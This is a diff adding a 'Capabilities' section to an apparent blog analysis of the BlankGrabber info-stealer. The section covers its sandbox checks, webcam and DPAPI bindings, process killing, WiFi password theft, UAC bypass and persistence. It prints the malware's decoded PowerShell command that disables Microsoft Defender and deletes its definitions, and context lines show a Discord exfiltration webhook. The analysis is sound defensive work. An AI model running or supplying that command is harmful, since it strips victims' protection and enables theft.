@@ -240,6 +240,8 @@ which decodes to `https://discord.com/api/webhooks/1339377338789527583/ZaaIPm4r2
 
 ![Discord cdn being leveraged to distribute executables](/images/blank-grabber-discord-cdn.png)
 
+### Capabilities
+
 If we keep on scrolling a bit lower we'll notice is that our sample has sandbox detection capabilities (although great ones). It's all wrapped in a class called "VMProtect", not to be confused with [VMProtect](https://vmpsoft.com/). It can:
 
 - Detect the device's UUID and compares it against a blacklist. I couldn't find exactly where these came from but a quick Google search brought me to [a repo](https://github.com/6nz/virustotal-vm-blacklist/blob/main/MachineGuid.txt) which points to them being hostnames used by VirusTotal (or similar services).
@@ -252,3 +254,37 @@ If we keep on scrolling a bit lower we'll notice is that our sample has sandbox 
 If any of these checks return positive, the sample terminates itself.
 
 {{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L65-L131" lang="py" hl="67-69,74,80,94,105,113-116,129">}}
+
+Moving on, we notice a few interesting WinAPI (for some reason named Syscalls although they're not Syscalls per se) bindings such as:
+
+- A binding to take a picture through the victim's webcam
+- A binding to [CreateMutexA](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexa)
+- A binding to [CryptUnprotectData](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata)
+- A binding to hide the current window (using [ShowWindow](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow) with the `nCmdShow` value of `0`)
+
+{{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L161-L203" lang="py" hl="173,181,194-198,202">}}
+
+We also notice the sample has the capability to terminate tasks via `taskkill /F /PID %d`. It's also good to note it first lists all PIDs via `tasklist /FO LIST`.
+
+{{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L210-L221" lang="py" hl="219">}}
+
+More notably, we notice it also has the capability of killing Microsoft Defender via this base64 encoded string
+
+{{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L227-L230" lang="py" hl="229">}}
+
+which decodes to the script below. It essentially disables the [IPS (exploitation of known vulns)](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disableintrusionpreventionsystem), [IO AV Protection (File download scan)](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disableioavprotection), [Real time Monitoring](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disablerealtimemonitoring), [Script scanning](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disablescriptscanning), [Controlled folder access](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-disablescriptscanning), [Network protection](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-enablenetworkprotection), [MAPS reporting](https://learn.microsoft.com/en-us/powershell/module/defender/remove-mppreference?view=windowsserver2025-ps#-mapsreporting), prevents suspicious sample submission and finally removes all definitions in Defender.
+
+{{< higlight powershell>}}
+powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2 & "%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+{{ /highlight}}
+
+It can also extract WiFi passwords, setup a UAC bypass, embed itself in the startup applications and block websites.
+
+{{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L241-L264" lang="py" hl="253">}}
+
+{{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L304-L320" lang="py" hl="310-315">}}
+
+{{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L328-L337" lang="py" hl="332,334">}}
+
+{{< emgithub target="https://github.com/cyb3rjerry/revengd-malware/blob/6ae8ebb5279ae177e026dd7b0015569d5e423b5b/blankgrabber/blankgrabber.py#L361-L371" lang="py" hl="364">}}
+
